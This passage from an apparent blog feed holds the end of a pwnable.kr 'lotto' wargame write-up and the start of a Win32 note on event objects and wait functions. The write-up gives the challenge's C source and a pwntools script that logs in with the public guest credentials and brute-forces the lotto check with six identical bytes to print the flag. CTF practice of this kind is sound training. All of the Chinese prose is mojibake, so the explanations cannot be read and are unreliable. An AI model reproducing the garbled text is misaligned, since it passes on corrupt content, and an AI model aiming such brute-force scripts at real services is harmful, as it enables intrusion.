class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> submit[<span class="number">6</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">play</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Submit your 6 lotto bytes : &quot;</span>);</span><br><span class="line">fflush(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> r;</span><br><span class="line">r = read(<span class="number">0</span>, submit, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Lotto Start!\n&quot;</span>);</span><br><span class="line"><span class="comment">//sleep(1);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// generate lotto numbers</span></span><br><span class="line"><span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, O_RDONLY);</span><br><span class="line"><span class="keyword">if</span>(fd==<span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;error. tell admin\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> lotto[<span class="number">6</span>];</span><br><span class="line"><span class="keyword">if</span>(read(fd, lotto, <span class="number">6</span>) != <span class="number">6</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;error2. tell admin\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</span><br><span class="line">lotto[i] = (lotto[i] % <span class="number">45</span>) + <span class="number">1</span>;<span class="comment">// 1 ~ 45</span></span><br><span class="line">&#125;</span><br><span class="line">close(fd);</span><br><span class="line"></span><br><span class="line"><span class="comment">// calculate lotto score</span></span><br><span class="line"><span class="keyword">int</span> match = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>; j&lt;<span class="number">6</span>; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(lotto[i] == submit[j])&#123;</span><br><span class="line">match++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// win!</span></span><br><span class="line"><span class="keyword">if</span>(match == <span class="number">6</span>)&#123;</span><br><span class="line">system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;bad luck...\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">help</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;- nLotto Rule -\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;nlotto is consisted with 6 random natural numbers less than 46\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;your goal is to match lotto numbers as many as you can\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;if you win lottery for *1st place*, you will get reward\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;for more details, follow the link below\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;mathematical chance to win this game is known to be 1/8145060.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// menu</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> menu;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;- Select Menu -\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;1. Play Lotto\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;2. Help\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;3. Exit\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;menu);</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>(menu)&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">play();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">help();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;bye\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;invalid menu\n&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨æœ¬åœ°è¿è¡Œç¨‹åºäº†è§£è¿‡ç¨‹ï¼Œæ„Ÿè§‰ç›¸å½“äºä¸€ä¸ªçŒœæ•°æ¸¸æˆï¼Œåˆ†æç¨‹åºä»£ç </p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210130221629615.png"></p><h4 id="éšæœºæ•°"><a href="#éšæœºæ•°" class="headerlink" title="éšæœºæ•°"></a>éšæœºæ•°</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// generate lotto numbers</span></span><br><span class="line"><span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, O_RDONLY);</span><br><span class="line"><span class="keyword">if</span>(fd==<span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;error. tell admin\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> lotto[<span class="number">6</span>];</span><br><span class="line"><span class="keyword">if</span>(read(fd, lotto, <span class="number">6</span>) != <span class="number">6</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;error2. tell admin\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</span><br><span class="line">lotto[i] = (lotto[i] % <span class="number">45</span>) + <span class="number">1</span>;<span class="comment">// 1 ~ 45</span></span><br><span class="line">&#125;</span><br><span class="line">close(fd);</span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç æ„æ€ä¸ºç”Ÿæˆ6ä¸ªå°äºç­‰äº45çš„éšæœºæ•°ï¼Œåˆšå¼€å§‹æˆ‘ä¸€ä¸ªurandomå’Œrandomæ˜¯ä¸€æ ·çš„ä¼ªéšæœºæ•°ï¼Œä½†æˆ‘ç”¨cè¯­è¨€å†™äº†ä¸€ä¸ªç®€å•çš„ç¨‹åºåå‘ç°å¹¶ä¸ä¸€æ ·</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> lotto[<span class="number">6</span>];</span><br><span class="line">        <span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, O_RDONLY);</span><br><span class="line">        read(fd, lotto, <span class="number">6</span>);</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d, &quot;</span>,lotto[i] % <span class="number">45</span> + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”Ÿæˆ a.outæ–‡ä»¶åè¿è¡Œç»“æœ</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210130222234571.png"></p><p>æ‰€ä»¥è¿™é“é¢˜å¹¶ä¸èƒ½ä½¿ç”¨ä¼ªéšæœºçš„ç‰¹æ€§æ¥åš</p><h4 id="æ£€æµ‹"><a href="#æ£€æµ‹" class="headerlink" title="æ£€æµ‹"></a>æ£€æµ‹</h4><p>ç»§ç»­åˆ†æä¸‹é¢çš„æ£€æµ‹å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> match = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>; j&lt;<span class="number">6</span>; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(lotto[i] == submit[j])&#123;</span><br><span class="line">match++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç å¾ˆæœ‰æ„æ€ï¼Œæˆ‘çœ‹ç¬¬ä¸€éæ—¶æ²¡æƒ³é‚£ä¹ˆå¤šï¼Œåªæ˜¯æƒ³åˆ°äº†è¾“å…¥çš„6ä¸ªå­—èŠ‚çš„é¡ºåºä¸ä¸€å®šè¦å’Œlottoæ•°ç»„ä¸­çš„æ•°æ®é¡ºåºç›¸åŒï¼Œä½†æ˜¯åœ¨åé¢å‘ç°è¿™é‡Œé¢å­˜åœ¨ä¸€ä¸ªç‚¹å°±æ˜¯ï¼Œè¿™æ²¡è€ƒè™‘æˆ‘ä»¬è¾“å…¥çš„6ä¸ªå­—èŠ‚å…¨æ˜¯ä¸€æ ·çš„æƒ…å†µï¼Œå¯ä»¥åˆ©ç”¨çˆ†ç ´</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p>è¿™é‡Œæ³¨æ„ä¸€ç‚¹ç»†èŠ‚æ˜¯æˆ‘ä»¬è¾“å…¥çš„å­—èŠ‚å¤§å°éœ€è¦å°äºç­‰äº45æ‰å¯ä»¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">payload = <span class="string">b&#x27;######&#x27;</span></span><br><span class="line">sh = ssh(<span class="string">&#x27;lotto&#x27;</span>, <span class="string">&#x27;pwnable.kr&#x27;</span>, password = <span class="string">&#x27;guest&#x27;</span>, port = <span class="number">2222</span>)</span><br><span class="line">p = sh.process(<span class="string">&#x27;./lotto&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Submit your 6 lotto bytes : &#x27;</span>,payload)</span><br><span class="line">    msg = p.recv()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;bad luck&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> msg:</span><br><span class="line">        sleep(<span class="number">3</span>)</span><br><span class="line">        log.success(msg)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">p.close()</span><br><span class="line">sh.close()</span><br></pre></td></tr></table></figure><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210130223218226.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;p&gt;&lt;img src=&quot;https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210130221133246.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;åˆ©ç”¨scpå‘½ä»¤ä»æœåŠ¡å™¨ä¸‹è½½æºç åˆ°æœ¬åœ°&lt;/p</summary>
      
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="pwn" scheme="http://example.com/categories/CTF/pwn/"/>
    
    <category term="pwnable.kr" scheme="http://example.com/categories/CTF/pwn/pwnable-kr/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="wp" scheme="http://example.com/tags/wp/"/>
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>ğŸ¦Win32å­¦ä¹ è®°å½•4(äº‹ä»¶ äº’æ–¥ä½“ ä¿¡å·é‡)</title>
    <link href="http://example.com/2020/11/12/windows/Win32-4/"/>
    <id>http://example.com/2020/11/12/windows/Win32-4/</id>
    <published>2020-11-12T14:00:20.492Z</published>
    <updated>2021-02-05T06:30:13.868Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h3 id="å¯¹è±¡"><a href="#å¯¹è±¡" class="headerlink" title="å¯¹è±¡"></a>å¯¹è±¡</h3><h4 id="çŠ¶æ€"><a href="#çŠ¶æ€" class="headerlink" title="çŠ¶æ€"></a>çŠ¶æ€</h4><ul><li>é€šçŸ¥çŠ¶æ€</li></ul><p>â€‹        è¡¨ç¤ºæ“ä½œç³»ç»Ÿå¯ä»¥è°ƒç”¨</p><ul><li><p>æœªé€šçŸ¥çŠ¶æ€</p><p>æ“ä½œç³»ç»Ÿä¸å¯ä»¥è°ƒç”¨</p><h4 id="WaitForSingleObjectå‡½æ•°"><a href="#WaitForSingleObjectå‡½æ•°" class="headerlink" title="WaitForSingleObjectå‡½æ•°"></a><strong>WaitForSingleObject</strong>å‡½æ•°</h4></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">WaitForSingleObject</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hHandle,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD  dwMilliseconds</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><ul><li><p><strong>hHandle</strong></p><p>å¯¹è±¡çš„å¥æŸ„ã€‚</p></li><li><p><strong>dwMilliseconds</strong></p><p>è¶…æ—¶é—´éš”ï¼ˆä»¥æ¯«ç§’ä¸ºå•ä½ï¼‰ã€‚å¦‚æœæŒ‡å®šäº†éé›¶å€¼ï¼Œåˆ™å‡½æ•°å°†ç­‰å¾…ï¼Œç›´åˆ°å‘å‡ºä¿¡å·é€šçŸ¥å¯¹è±¡æˆ–é—´éš”è¿‡å»ä¸ºæ­¢ã€‚å¦‚æœ<em>dwMilliseconds</em>ä¸ºé›¶ï¼Œåˆ™å¦‚æœæœªç”¨ä¿¡å·é€šçŸ¥å¯¹è±¡ï¼Œåˆ™å‡½æ•°ä¸ä¼šè¿›å…¥ç­‰å¾…çŠ¶æ€ï¼›å¦åˆ™ï¼Œå‡½æ•°å°†è¿›å…¥ç­‰å¾…çŠ¶æ€ã€‚å®ƒæ€»æ˜¯ç«‹å³è¿”å›ã€‚å¦‚æœ<em>dwMilliseconds</em>ä¸º<strong>INFINITE</strong>ï¼Œåˆ™è¯¥å‡½æ•°ä»…åœ¨ä¿¡å·é€šçŸ¥å¯¹è±¡æ—¶è¿”å›ã€‚</p></li></ul><h4 id="WaitForMultipleObjectså‡½æ•°"><a href="#WaitForMultipleObjectså‡½æ•°" class="headerlink" title="WaitForMultipleObjectså‡½æ•°"></a>WaitForMultipleObjectså‡½æ•°</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">WaitForMultipleObjects</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD        nCount,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">const</span> HANDLE lpHandles,</span></span></span><br><span class="line"><span class="function"><span class="params">  BOOL         bWaitAll,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD        dwMilliseconds</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><ul><li><p><strong>nCount</strong></p><p><em>lpHandles</em>æŒ‡å‘çš„æ•°ç»„ä¸­å¯¹è±¡å¥æŸ„çš„æ•°é‡ã€‚å¯¹è±¡å¥æŸ„çš„æœ€å¤§æ•°é‡ä¸º<strong>MAXIMUM_WAIT_OBJECTS</strong>ã€‚æ­¤å‚æ•°ä¸èƒ½ä¸ºé›¶ã€‚</p></li><li><p><strong>lpHandles</strong></p><p>å¯¹è±¡å¥æŸ„æ•°ç»„ã€‚</p></li><li><p><strong>bWaitAll</strong></p><p>å¦‚æœæ­¤å‚æ•°ä¸º<strong>TRUE</strong>ï¼Œåˆ™å½“ä¿¡å·<em>lpHandles</em>æ•°ç»„ä¸­æ‰€æœ‰å¯¹è±¡çš„çŠ¶æ€æ—¶ï¼Œè¯¥å‡½æ•°å°†è¿”å›ã€‚å¦‚æœä¸º<strong>FALSE</strong>ï¼Œåˆ™å½“ä»»ä½•ä¸€ä¸ªå¯¹è±¡çš„çŠ¶æ€è®¾ç½®ä¸ºå·²ä¿¡å·é€šçŸ¥æ—¶ï¼Œè¯¥å‡½æ•°å°†è¿”å›ã€‚åœ¨åä¸€ç§æƒ…å†µä¸‹ï¼Œè¿”å›å€¼æŒ‡ç¤ºå…¶çŠ¶æ€å¯¼è‡´å‡½æ•°è¿”å›çš„å¯¹è±¡ã€‚</p></li><li><p><strong>dwMilliseconds</strong></p><p>è¶…æ—¶é—´éš”ï¼ˆä»¥æ¯«ç§’ä¸ºå•ä½ï¼‰ã€‚å¦‚æœæŒ‡å®šäº†éé›¶å€¼ï¼Œåˆ™å‡½æ•°å°†ç­‰å¾…ï¼Œç›´åˆ°å‘å‡ºæŒ‡å®šå¯¹è±¡çš„ä¿¡å·æˆ–é—´éš”è¿‡å»ä¸ºæ­¢ã€‚å¦‚æœ<em>dwMilliseconds</em>ä¸ºé›¶ï¼Œåˆ™å¦‚æœæœªå‘å‡ºæŒ‡å®šå¯¹è±¡çš„ä¿¡å·ï¼Œåˆ™å‡½æ•°ä¸ä¼šè¿›å…¥ç­‰å¾…çŠ¶æ€ï¼›å¦åˆ™ï¼Œå‡½æ•°å°†è¿›å…¥ç­‰å¾…çŠ¶æ€ã€‚å®ƒæ€»æ˜¯ç«‹å³è¿”å›ã€‚å¦‚æœ<em>dwMilliseconds</em>ä¸º<strong>INFINITE</strong>ï¼Œåˆ™è¯¥å‡½æ•°ä»…åœ¨å‘å‡ºæŒ‡å®šå¯¹è±¡çš„ä¿¡å·æ—¶è¿”å›ã€‚</p></li></ul><h3 id="äº‹ä»¶"><a href="#äº‹ä»¶" class="headerlink" title="äº‹ä»¶"></a>äº‹ä»¶</h3><h4 id="äº‹ä»¶å¯¹è±¡çš„åˆ›å»º"><a href="#äº‹ä»¶å¯¹è±¡çš„åˆ›å»º" class="headerlink" title="äº‹ä»¶å¯¹è±¡çš„åˆ›å»º"></a>äº‹ä»¶å¯¹è±¡çš„åˆ›å»º</h4><ul><li><p>å‡½æ•°</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateEventA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPSECURITY_ATTRIBUTES lpEventAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">  BOOL                  bManualReset,</span></span></span><br><span class="line"><span class="function"><span class="params">  BOOL                  bInitialState,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR                lpName</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><h5 id="å‚æ•°"><a href="#å‚æ•°" class="headerlink" title="å‚æ•°"></a>å‚æ•°</h5><ul><li><p><strong>lpEventAttributes</strong></p><p>å†…æ ¸å¯¹è±¡éƒ½æ‹¥æœ‰è¯¥å‚æ•°ï¼Œä¸€èˆ¬æƒ…å†µä¸‹è®¾ç½®<strong>NULL</strong></p></li><li><p><strong>bManualReset</strong></p><p>å¸ƒå°”ç±»å‹</p><ul><li><p>TRUE</p><p>åˆ›å»ºä¸€ä¸ªæ‰‹åŠ¨é‡ç½®çš„æ—¶é—´å¯¹è±¡ï¼Œé‡ç½®éœ€è¦ç”¨åˆ°ResetEventå‡½æ•°å°†äº‹ä»¶çŠ¶æ€è®¾ç½®ä¸ºéä¿¡å·çŠ¶æ€(æœªé€šçŸ¥çŠ¶æ€)</p></li><li><p>FALS</p><p>åˆ›å»ºä¸€ä¸ªè‡ªåŠ¨é‡ç½®äº‹ä»¶å¯¹è±¡,åœ¨é‡Šæ”¾å•ä¸ªç­‰å¾…çº¿ç¨‹åï¼Œç³»ç»Ÿè‡ªåŠ¨å°†äº‹ä»¶çŠ¶æ€é‡ç½®ä¸ºæœªé€šçŸ¥çŠ¶æ€</p><p>{ç®€å•æ¥è¯´}</p></li></ul></li><li><p><strong>bInitialState</strong></p><p>å¦‚æœæ­¤å‚æ•°ä¸º<strong>TRUE</strong>ï¼Œåˆ™è¡¨ç¤ºäº‹ä»¶å¯¹è±¡çš„åˆå§‹çŠ¶æ€ï¼›</p><p><strong>å¦åˆ™</strong>ï¼Œå°†æ˜¾ç¤ºäº‹ä»¶å¯¹è±¡çš„åˆå§‹çŠ¶æ€ã€‚å¦åˆ™ï¼Œå®ƒæ˜¯æ— ä¿¡å·çš„ã€‚</p></li><li><p><strong>lpName</strong></p><p>äº‹ä»¶åç§°</p></li></ul></li></ul><h4 id="äº‹ä»¶å¯¹è±¡çš„æ§åˆ¶"><a href="#äº‹ä»¶å¯¹è±¡çš„æ§åˆ¶" class="headerlink" title="äº‹ä»¶å¯¹è±¡çš„æ§åˆ¶"></a>äº‹ä»¶å¯¹è±¡çš„æ§åˆ¶</h4><h5 id="SetEvnet"><a href="#SetEvnet" class="headerlink" title="SetEvnet()"></a>SetEvnet()</h5><ul><li><p>å‡½æ•°å®šä¹‰</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">SetEvent</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hEvent</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p>å°†äº‹ä»¶è®¾ç½®ä¸ºå·²é€šçŸ¥çŠ¶æ€</p></li></ul><h5 id="ResetEvent"><a href="#ResetEvent" class="headerlink" title="ResetEvent"></a>ResetEvent</h5><ul><li><p>å‡½æ•°å®šä¹‰</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">ResetEvent</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hEvent</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p>å°†äº‹ä»¶è®¾ç½®ä¸ºæœªé€šçŸ¥çŠ¶æ€</p></li></ul><h4 id="äº‹ä»¶åŒæ­¥â€“æ¶ˆè´¹è€…ä¸ç”Ÿäº§è€…"><a href="#äº‹ä»¶åŒæ­¥â€“æ¶ˆè´¹è€…ä¸ç”Ÿäº§è€…" class="headerlink" title="äº‹ä»¶åŒæ­¥â€“æ¶ˆè´¹è€…ä¸ç”Ÿäº§è€…"></a>äº‹ä»¶åŒæ­¥â€“æ¶ˆè´¹è€…ä¸ç”Ÿäº§è€…</h4><p>â€‹        äº‹ä»¶çš„åŒæ­¥è§£é‡Šä¸ºå°†çº¿ç¨‹æŒ‰ç…§è§„å®šçš„é¡ºåºè¿›è¡Œï¼Œçº¿ç¨‹è¢«åˆ›å»ºå‡ºæ¥æ˜¯è¢«éšæœºåˆ†é…çš„CPUçš„ï¼Œé‚£ä¸ªCPUç©ºé—²å°±åˆ†é…ç»™å“ªä¸ªçº¿ç¨‹(è¯´å¾—ä¸æ˜¯å¾ˆä¸“ä¸šï¼Œå…·ä½“å‚ç…§å¾®è½¯å®˜æ–¹å®šä¹‰)ï¼Œæ‰€ä»¥äº‹ä»¶çš„åŒæ­¥å¯ä»¥ç†è§£ä¸ºäººä¸ºçš„æ§åˆ¶çº¿ç¨‹è¿è¡Œçš„é¡ºåº</p><p>â€‹        ä¸‹é¢ä¸ºç”¨äº‹ä»¶è¿›è¡Œçº¿ç¨‹åŒæ­¥çš„æ€è·¯</p><ul><li><p>åˆ›å»ºä¸¤ä¸ªäº‹ä»¶ï¼Œäº‹ä»¶Aå’Œäº‹ä»¶Bï¼Œä¸€ä¸ªäº‹ä»¶åˆå§‹åŒ–ä¸ºé€šçŸ¥çŠ¶æ€ï¼Œå¦ä¸€ä¸ªåˆå§‹åŒ–ä¸ºå·²é€šçŸ¥çŠ¶æ€ï¼Œä¸”ä¸¤ä¸ªäº‹ä»¶éƒ½è®¾ç½®ä¸ºæ‰‹åŠ¨æ›´æ”¹çŠ¶æ€</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a_Event = CreateEvent(<span class="literal">NULL</span>, FALSE, TRUE, <span class="literal">NULL</span>);</span><br><span class="line">b_Event = CreateEvent(<span class="literal">NULL</span>, FALSE, FALSE, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure></li><li><p>åˆ›å»ºçº¿ç¨‹1</p><figure class="highlight 